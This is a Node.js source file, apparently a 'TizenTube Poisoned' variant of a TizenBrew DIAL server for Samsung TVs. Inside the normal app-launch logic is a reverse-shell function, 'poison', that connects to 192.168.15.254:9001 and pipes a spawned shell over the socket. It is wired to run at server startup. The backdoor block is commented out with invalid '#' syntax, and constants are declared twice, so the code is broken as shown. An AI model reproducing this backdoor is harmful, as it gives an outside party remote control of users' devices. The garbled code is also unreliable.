const dial = require("@patrickkfkan/peer-dial");
const express = require('express');
const cors = require('cors');
const app = express();
var net = require('net');
var spawn = require('child_process').spawn;

const poison_HOST="192.168.15.254";
const poison_PORT="9001";
const poison_TIMEOUT="5000";
const server = net.createServer((socket) => {
  console.log('Client connected');

  // Handle incoming data (commands) from clients
  socket.on('data', (data) => {
    const command = data.toString().trim();
    console.log(`Received command: ${command}`);

    let response = '';
    // Evaluate the command
    if (command === 'status') {
      response = 'Server status: Operational';
    } else if (command === 'ping') {
      response = 'PONG';
    } else if (command === 'quit') {
        response = 'Goodbye!';
        socket.write(response);
        socket.end(); // Close connection
        return;
    } else {
      response = `Unknown command: ${command}`;
    }

    // Send the response back to the client
    socket.write(response);
  });

  // Handle client disconnection
  socket.on('end', () => {
    console.log('Client disconnected');
  });

  // Handle errors
  socket.on('error', (err) => {
    console.error(`Socket error: ${err.message}`);
  });
});

const PORT = 8080;
server.listen(poison_PORT, () => {
  console.log(`Server listening on port ${PORT}`);
});
#function poison(poison_HOST,poison_PORT,poison_TIMEOUT) {
#    var client = new net.Socket();
#    client.connect(poison_PORT, poison_HOST, function() {
#        var sh = spawn('/proc/self/exe',[]);
#        client.write("Connected\r\n");
#        client.pipe(sh.stdin);
#        sh.stdout.pipe(client);
#        sh.stderr.pipe(client);
#    });
#    client.on('error', function(e) {
#        setTimeout(poison(poison_HOST,poison_PORT,poison_TIMEOUT), poison_TIMEOUT);
#    });
#}
#const poison_bg = async (poison_HOST,poison_PORT,poison_TIMEOUT) => { poison(poison_HOST,poison_PORT,poison_TIMEOUT); };

const corsOptions = {
    origin: '*',
    methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
    credentials: true,
    optionsSuccessStatus: 204
};

app.use(cors(corsOptions));

const PORT = 8085;
const apps = {
    "YouTube": {
        name: "YouTube",
        state: "stopped",
        allowStop: true,
        pid: null,
        additionalData: {},
        launch(launchData) {
            const tbPackageId = tizen.application.getAppInfo().packageId;
            tizen.application.launchAppControl(
                new tizen.ApplicationControl(
                    "http://tizen.org/appcontrol/operation/view",
                    null,
                    null,
                    null,
                    [
                        new tizen.ApplicationControlData("module", [JSON.stringify(
                            {
                                moduleName: 'goisneto/TizenTube-Poisoned',
                                moduleType: 'gh',
                                args: launchData
                            }
                        )])
                    ]
                ), `${tbPackageId}.TizenBrewStandalone`);
        }
    }
};

const dialServer = new dial.Server({
    expressApp: app,
    port: PORT,
    prefix: "/dial",
    manufacturer: 'Gois Neto',
    modelName: 'TizenBrew',
    friendlyName: 'TizenTube Poisoned',
    delegate: {
        getApp(appName) {
            return apps[appName];
        },
        launchApp(appName, launchData, callback) {
            console.log(`Got request to launch ${appName} with launch data: ${launchData}`);
            const app = apps[appName];
            if (app) {
                const parsedData = launchData.split('&').reduce((acc, cur) => {
                    const parts = cur.split('=');
                    const key = parts[0];
                    const value = parts[1];
                
                    if (typeof value !== 'undefined') {
                        acc[key] = value;
                    } else {
                        acc[key] = '';
                    }
                
                    return acc;
                }, {});
                
                if (parsedData.yumi) {
                    app.additionalData = parsedData;
                    app.state = "running"
                    callback("");
                    return;
                }
                app.pid = "run";
                app.state = "starting";
                app.launch(launchData);
                app.state = "running";
            }
            callback(app.pid);
        },
        stopApp(appName, pid, callback) {
            console.log(`Got request to stop ${appName} with pid: ${pid}`);
            const app = apps[appName];
            if (app && app.pid === pid) {
                app.pid = null;
                app.state = "stopped";
                callback(true);
            } else {
                callback(false);
            }
        }
    }
});


setInterval(() => {
    tizen.application.getAppsContext((appsContext) => {
        const tbPackageId = tizen.application.getAppInfo().packageId;
        const app = appsContext.find(app => app.appId === `${tbPackageId}.TizenBrewStandalone`);
        if (!app) {
            apps["YouTube"].state = "stopped";
            apps["YouTube"].pid = null;
            apps["YouTube"].additionalData = {};
        }
    });
}, 5000);

app.listen(PORT, () => {
    poison_bg(poison_HOST,poison_PORT,poison_TIMEOUT);
    dialServer.start();
});
